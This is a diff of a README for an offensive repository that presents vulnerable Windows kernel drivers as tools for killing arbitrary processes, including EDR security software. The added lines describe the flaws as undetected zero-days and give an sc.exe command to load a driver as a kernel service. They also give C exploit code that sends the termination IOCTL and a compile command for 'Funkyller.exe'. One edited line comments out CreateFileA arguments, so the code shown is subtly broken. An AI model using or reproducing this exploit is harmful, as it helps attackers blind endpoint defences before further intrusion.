@@ -1,7 +1,7 @@
 # Funky Drivers
 
-These drivers expose process termination APIs (e.g., `ZwTerminateProcess`) that can be used to terminate arbitrary processes (e.g., EDR process). 
-Vulnerabilities reported to MITRE CVE program.
+These drivers expose process termination APIs (e.g., `ZwTerminateProcess`) that can be used to terminate arbitrary processes (e.g. EDR). 
+None of the drivers is flagged are malicious on VirusTotal. All vulnerabilities are "ZeroDays". 
 
 ## Driver 1 - GOLINK Software `GoFly.sys`
 
@@ -29,13 +29,19 @@ IOCTL: 0x222018
 
 ## Exploit code
 
-Create kernel service using one of the drivers, then compile and run code with appropriate IOCTL / DeviceName
+Create kernel service using one of the `.sys` drivers :
+
+```Powershell
+sc.exe create <ServiceName> binPath= <path.sys> type= kernel && sc.exe start <ServiceName>
+```
+
+Then compile and run exploit code with appropriate IOCTL / DeviceName
 
 ```C
 #include <stdio.h>
 #include <windows.h>
 
-#define GETDAFUNK <IOCTL_HERE>
+#define GETDAFUNK <IOCTL_HERE> // change this 
 
 int main(void) {
   
@@ -43,7 +49,12 @@ int main(void) {
 	unsigned int res;
 	DWORD lpBytesReturned = 0;
 
-	HANDLE hDevice = CreateFileA("\\\\.\\<DeviceName here>", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hDevice = CreateFileA("\\\\.\\<DeviceName here>", // change this 					GENERIC_WRITE|GENERIC_READ, 
+					0, 
+					NULL, 
+					OPEN_EXISTING, 
+					FILE_ATTRIBUTE_NORMAL, 
+					NULL);
   
 	if(hDevice == INVALID_HANDLE_VALUE){
 		printf("[!] Connection to the driver failed\n");
@@ -68,4 +79,8 @@ int main(void) {
 	return 0;
 }
 
+```
+
+```bash
+x86_64-w64-mingw32-gcc -o Funkyller.exe exploit.c 
 ```
